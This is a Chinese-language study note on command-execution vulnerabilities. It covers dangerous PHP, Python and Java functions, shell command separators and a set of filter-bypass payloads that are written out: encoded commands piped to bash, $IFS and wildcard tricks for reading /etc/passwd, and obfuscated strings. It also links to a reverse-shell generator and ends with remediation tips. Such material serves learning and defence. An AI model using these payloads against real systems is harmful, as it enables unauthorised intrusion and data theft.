---
title: RCE-命令执行漏洞
tags:
  - web安全
creation date: 2024-03-18
done: true
---
> [!note]  
> **命令执行漏洞**（remote command/code execute）是指攻击者可以在应用程序中执行任意系统命令的漏洞。    
> 这种漏洞通常存在于应用程序的输入验证中，攻击者可以利用输入验证不严格或者未对输入进行过滤的情况下，注入可执行的系统命令。    
> 攻击者可以通过输入恶意命令来利用此漏洞，这些命令可能会导致系统数据泄露、拒绝服务或完全控制受影响的系统。  
# 1. 命令执行危险函数  
---
## 1.1 PHP 命令执行  
### 1.1.1 PHP 代码执行相关函数  
- `eval(string $code);`：将一个字符串作为 PHP 代码执行。  
- `assert(mixed $assertion [, mixed $description])`：用于检查代码中的条件是否为 true。如果条件为 false，则会抛出异常。  
    - `$assertion`：必需。需要检查的表达式。如果`assertion`是字符串，它将会被`assert()`当做PHP代码来执行。  
- `preg_replace($pattern, $replacement, $subject)`：用于在字符串中搜索匹配正则表达式的部分，并将其替换为指定的值。  
    - 当使用  `/e` 模式修饰符进行替换操作，这会将替换值作为 PHP 代码进行解析和执行。    
    - `$pattern`：要搜索的正则表达式  
    - `$replacement`：要替换的字符串或者回调函数  
    - `$subject`：要进行搜索和替换的原始字符串。  
- `call_user_func(callable $callback, [, mixed $parameter [, mixed $... ]] ))`：用于调用用户自定义的函数。  
    - `$callback`：被调用的函数名。`$parameter`：被调用函数的参数。  
    - 例如：`call_user_func($_GET['func_name'],$_GET['payload']);` → `?func_name=eval&payload=phpinfo()`  
- `call_user_func_array($funcName, array($param1, …))`：用于调用用户自定义的函数。  
    - `$callback`：被调用的函数名。`array`：被调用函数的参数数组。  
    - 例如：`call_user_func($_GET['func_name'],$_GET['payload']);` → `func_name=eval&payload[]=phpinfo()`  
- 双引号：在双引号中可以包含变量并被解析，可以直接使用转移字符。  

### 1.1.2 PHP 系统命令执行相关函数  
- `exec(string $command [, array &$output [, int &$return_var ]])`：用于执行外部程序或 shell 命令的函数。需要注意，要以`;`结尾，并且仅输出结果的最后一行。  
- `shell_exec(string $cmd)`：用于执行 shell 命令并返回完整的输出。  
- `system(command, return_var)`：可以直接执行系统命令，用于一些需要通过系统命令来执行的操作，例如压缩和解压缩文件等。  
- `passthru($command)`：可以执行外部程序并将结果直接输出到浏览器。不会对命令执行结果进行过滤，而是将结果原封不动地输出到浏览器。  
- 反单引号 \`：在 PHP 中称之为执行运算符，可以将其内容作为 shell 命令来执行，并输出信息返回。息返回。
- `array_filter(array $array [, callable $callback [, int $flag = 0 ]])`：过滤数组中的元素，返回一个过滤后的数组，可以通过指定一个回调函数来决定是否保留元素。  
    - 如果将 `$callback` 参数设置为一个可以被攻击者控制的字符串，攻击者就可以在回调函数中注入恶意代码，导致命令执行漏洞。  

## 1.2 python 命令执行  
- `os.system(command)`：执行 command 命令。  
- `popen(cmd, mode, buffering)`：打开一个通往或接受命令 cmd 的管道。返回值是连接到该管道的已打开文件对象。  
	- `mode`：文件打开模式。  
	- `buffering`：可选参数，是一个可选的整数，用于设置缓冲策略。
- `subprocess.call(args, shell)`：运行 args 所描述的命令，等待命令完成后，返回 returncode 属性。  
- `pty.spawn(argv)`：生成一个进程，并将其控制终端连接到当前进程的标准 io。  

## 1.3 Java 命令执行  
- `java.lang.Runtime.getRuntime().exec(command)`：用于调用外部可执行程序或系统命令，并重定向外部程序的标准输入、标准输出和标准错误到缓冲池。

# 2. 命令拼接符  
---
## 2.2 Windows的命令拼接符  

| 拼接符    | 示例         | 含义                                                |
| ------ | ---------- | ------------------------------------------------- |
| **&**  | **A & B**  | 执行 A 与 B                                          |
| **&&** | **A && B** | 若 A 执行失败，不执行 B；若 A 执行成功，执行 B                      |
| **\|** | **A \| B** | 当 A 执行成功时：A 命令的输出内容，作为 B 命令的输入<br>当 A 执行失败时：不执行 B |
| **\|\|**   | **A \|\| B**   | 若 A 执行失败，执行 B；若 A 执行成功，不执行 B                      |

## 2.3 Linux 的命令拼接符  

| 拼接符  | 示例        | 含义                                                 |
| ---- | --------- | -------------------------------------------------- |
| **;**    | **A ; B ; C** | 分割多个命令，多个命令按照先后顺序依次执行                              |
| **&**    | **A & B &**   | 将一个命令放入后台执行，同时执行多个命令                               |
| **&&**   | **A && B**    | 若 A 执行成功，执行 B；<br>若 A 执行失败，不执行 B                   |
| **\|**   | **A \| B**    | 当 A 执行成功时：A 命令的输出内容，作为 B 命令的输入；<br>当 A 执行失败时：不执行 B |
| **\|\|** | **A \|\| B**  | 若 A 执行失败，执行 B；若 A 执行成功，不执行 B                       |

# 3. 常见绕过方法
---
## 3.1 编码绕过  
网站应用可能会过滤某些分隔符或者常用的命令，可以使用 url 编码、base64编码等尝试绕过。  
```Shell  
# ls   
# 将ls进行base64 编码，echo输出编码，传入下一个命令进行base64解码，再传入下一个命令，通过bash执行ls  
# %20是url编码，对应的是空格  
echo%20bHM=|base64%20-d|bash  
```

## 3.2 进制绕过  
Linux 下可以使用 `printf`、`xxd` 等命令进行进制转换  
### 3.2.1 八进制绕过  
```Shell  
# ls -> 八进制  
printf "\154\163" | bash  
```

### 3.2.2 十六进制绕过  
```Shell  
# ls -> 十六进制  
# 方法1  
printf "\x6C\x73" | bash  
  
# 方法2  
echo "6C73" | xxd -r -p | bash  
```

## 3.3 空格绕过  
- `$IFS$9`：  
    - `$IFS`：是一个环境变量，代表当前系统中的分隔符。  
    - `$9`：将当前分隔符替换为水平制表符`\t`  
    ```Shell  
    cat${IFS}/etc/passwd  
    cat${IFS}$9/etc/passwd  
    cat$IFS$9/etc/passwd  
    ```
- `<>`  
    ```Shell  
    cat<>/etc/passwd  
    ```
- `<`  
	```Shell
	cat</etc/passwd
	```

## 3.4 参数截断绕过  
将 payload 拆分成多个参数，每个参数长度不超过 WAF 规定的最大长度，绕过 WAF 的参数长度限制。  
```Shell  
# ls -al | whoami  
ls&arg1=-al&arg2=|whoami  
```

## 3.5 拼接字符绕过  
将payload拆分成多个字符串，使用多种方式拼接起来，绕过WAF的命令拼接检测。  
```Shell  
 # ls  
 e""cho bHM= | b''ase64 -d | ba"sh"  
```

## 3.6 空变量绕过  
```Shell  
# $x x只能是一位数字  
wh$5oami  
  
# ${x} x大小任意整数  
wh${5665449}oami  
  
# $@  
whoa$@mi  
  
# $<str>  
cat$a /etc$b/passwd$z  
```

## 3.7 通配符绕过  

|**通配符**|**含义**|**示例**|
|-|-|-|
|**`*`**|零个或多个字符|`cat /etc/p*sswd`|
|**`?`**|一个任意字符|`cat /etc/p?sswd`|
|`[ - ]`|一组字符中的任意一个或一定范围内的任意字符|`cat /etc/p[a-z]sswd`|
|`{ }`|代表一组备选字符串，用逗号分隔|`cat /etc/p{a,e}sswd`|

# 4. 反弹shell  
--- 
[反弹shell命令在线生成器|🔰雨苁🔰](https://www.ddosi.org/shell/)  

# 5. 漏洞修复和预防
---
- 转义命令中的所有 shell 元字符，包括：```#&;`,|*?~<>^()[]{}$\```；  
- 尽量不使用命令执行的危险函数，不要执行外部的应用程序或者命令；  
- 严格检查用户输入的内容，使用白名单或者正则表达式进行过滤；  
- 禁止不被使用的敏感函数。  
